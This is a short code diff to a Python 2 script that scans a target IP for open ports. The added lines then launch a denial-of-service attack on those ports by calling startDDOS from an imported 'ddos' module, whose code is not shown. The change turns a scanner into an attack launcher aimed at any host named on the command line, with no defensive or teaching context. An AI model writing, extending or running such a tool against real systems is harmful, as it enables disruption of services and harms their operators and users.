@@ -1,5 +1,6 @@
 import sys
 from port_scan_threading import get_open_ports
+from ddos import startDDOS
 
 
 if __name__ == '__main__':
@@ -11,4 +12,12 @@ if __name__ == '__main__':
     max_port = int(sys.argv[2])
     open_ports = get_open_ports(target_ip, max_port=max_port)
 
-    print open_ports
+    if (len(open_ports) < 1):
+        print "No open ports"
+        sys.exit(0)
+
+    print "Open ports: %s" % open_ports
+    print "Starting DDOS"
+
+    startDDOS(target_ip, open_ports, 1)
+    
